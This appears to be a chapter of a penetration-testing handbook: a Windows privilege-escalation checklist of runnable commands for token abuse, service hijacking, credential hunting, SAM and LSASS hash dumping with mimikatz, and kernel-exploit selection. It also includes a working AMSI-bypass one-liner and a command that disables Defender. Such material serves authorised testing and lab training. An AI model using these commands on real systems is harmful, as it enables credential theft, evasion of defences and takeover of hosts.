# 05 — Windows Privilege Escalation

**Jump to:** [First 5 minutes on any Windows shell](#first-5-minutes-on-any-windows-shell) · [Run the automated tools first](#run-the-automated-tools-first) · [Token privileges (check `whoami /priv` first — this is the fastest win)](#token-privileges-check-whoami-priv-first--this-is-the-fastest-win) · [Service misconfigurations](#service-misconfigurations) · [Credential hunting](#credential-hunting) · [Dumping hashes (once you have local admin)](#dumping-hashes-once-you-have-local-admin) · [Kernel exploits (last resort)](#kernel-exploits-last-resort) · [AV / Defender bypass gotchas](#av--defender-bypass-gotchas) · [Once SYSTEM / admin](#once-system--admin)

Trigger: any shell on a Windows host.
Reference: [Windows Privilege Escalation](../4-post-exploitation/02-windows-privilege-escalation.md) · [Credential Dumping](../4-post-exploitation/03-credential-dumping.md).

## First 5 minutes on any Windows shell

- [ ] Identify yourself: `whoami; whoami /priv; whoami /groups; hostname`.
- [ ] OS + patch level: `systeminfo`. Note `OS Version` and installed hotfixes.
- [ ] Domain-joined? `systeminfo | findstr /B "Domain"`. If `WORKGROUP`, skip AD attacks.
- [ ] Users: `net user`; groups: `net localgroup`; admins: `net localgroup administrators`.

## Run the automated tools first

- [ ] Upload and run **winPEAS**: `winpeas.exe > lp.txt` (or the `.bat` if `.exe` is blocked).
- [ ] Alternative — `PowerUp.ps1` from PowerSploit: `. .\PowerUp.ps1; Invoke-AllChecks`.
- [ ] Alternative — `Seatbelt.exe` for host recon.

## Token privileges (check `whoami /priv` first — this is the fastest win)

Any of these = instant local admin/SYSTEM:

- [ ] `SeImpersonatePrivilege` → **PrintSpoofer** / **JuicyPotatoNG** / **GodPotato** → SYSTEM.
- [ ] `SeAssignPrimaryToken` → RoguePotato / PrintSpoofer.
- [ ] `SeBackupPrivilege` → read `SAM` / `SYSTEM` hives → dump hashes offline with `secretsdump`.
- [ ] `SeRestorePrivilege` → overwrite `utilman.exe` with `cmd.exe` → boot to SYSTEM shell.
- [ ] `SeTakeOwnershipPrivilege` → same, via `takeown`.
- [ ] `SeDebugPrivilege` → inject into a SYSTEM process.
- [ ] `SeManageVolumePrivilege` → arbitrary file write as SYSTEM.
- [ ] `SeTcbPrivilege` → act as part of the OS → SYSTEM.

## Service misconfigurations

- [ ] Unquoted service paths: `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\"`. If path has spaces + no quotes → drop a binary.
- [ ] Weak service permissions: `accesschk.exe /accepteula -uwcqv <user> *` — writable SCM entry = win.
- [ ] Service binary writable but not the SCM entry? Replace the binary → restart the service.
- [ ] `sc qc <service>` — check `SERVICE_START_NAME`. If it runs as `LocalSystem` and you can start/stop it, replace the exe.
- [ ] AlwaysInstallElevated: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` — if both HKCU + HKLM are 1, `msiexec /quiet /qn /i evil.msi` → SYSTEM.

## Credential hunting

- [ ] **Running as a service account (`sql_svc`, `svc_*`, `*_svc`, or `whoami` shows a service identity)? Read that service's own install / log / config directory FIRST** — go to the known path, don't recurse `C:\` (it'll hang your shell). Service logs, *including error logs*, and config files routinely leak plaintext creds. Classic: MSSQL writes failed logins to its `ERRORLOG`, so a user who fat-fingered their password into the username field leaks it in cleartext — `type "<SQL-dir>\MSSQL\Log\ERRORLOG*"`. Same pattern for IIS app pools (`web.config`), scheduled-task scripts, and any custom service's data dir.
- [ ] Registry autorun creds: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword`.
- [ ] Unattend files: `dir /s /b unattend.xml sysprep.xml autounattend.xml 2>nul`.
- [ ] PowerShell history: `type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.
- [ ] Saved RDP creds: `cmdkey /list`; use with `runas /savecred /user:<user> cmd.exe`.
- [ ] Chrome / Edge / Firefox saved passwords — `SharpChrome`, `SharpDPAPI`.
- [ ] KeePass `.kdbx` files anywhere on disk.
- [ ] Browser tokens for cloud consoles.
- [ ] GPP `cpassword` in `\\<dc>\SYSVOL\<domain>\Policies\` (LDAP/SMB, not local — but worth checking).

## Dumping hashes (once you have local admin)

- [ ] `reg save HKLM\SAM sam.save; reg save HKLM\SYSTEM system.save; reg save HKLM\SECURITY security.save` → exfil → `impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL`.
- [ ] LSASS dump: `procdump -accepteula -ma lsass.exe lsass.dmp` → `pypykatz lsa minidump lsass.dmp`.
- [ ] `mimikatz.exe` — `privilege::debug; sekurlsa::logonpasswords; lsadump::sam`.
- [ ] `nxc smb <ip> -u <admin> -p <pass> --sam --lsa --dpapi` from a remote host if you have creds.

## Kernel exploits (last resort)

- [ ] `systeminfo` → paste into [Watson](https://github.com/rasta-mouse/Watson) or `windows-exploit-suggester`.
- [ ] Common wins: **MS17-010** (EternalBlue), **MS16-032**, **MS15-051**, **CVE-2021-1732**.
- [ ] Only do this if nothing else works — kernel exploits crash boxes.

## AV / Defender bypass gotchas

- [ ] Payload flagged? Try obfuscation: `Invoke-Obfuscation`, or roll your own with `msfvenom --encoder`.
- [ ] AMSI kills PowerShell? `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` (patched in recent versions — have 3 bypasses ready).
- [ ] Constrained language mode? Use `.NET` reflection or drop to `cmd.exe`.
- [ ] Disable Defender if you're admin: `Set-MpPreference -DisableRealtimeMonitoring $true`.

## Once SYSTEM / admin

- [ ] `type C:\Users\Administrator\Desktop\root.txt` (or wherever).
- [ ] Dump SAM + LSA + LSASS — every hash to feed cracker and Pass-the-Hash.
- [ ] Search all user profiles for creds/notes.
- [ ] Check for domain admin sessions — logged-on users (`qwinsta`, `tasklist /v /fi "username eq domain\\*"`).
- [ ] Check trust relationships to other domains.
- [ ] Now: [07-pivoting.md](./07-pivoting.md) if another subnet is reachable.
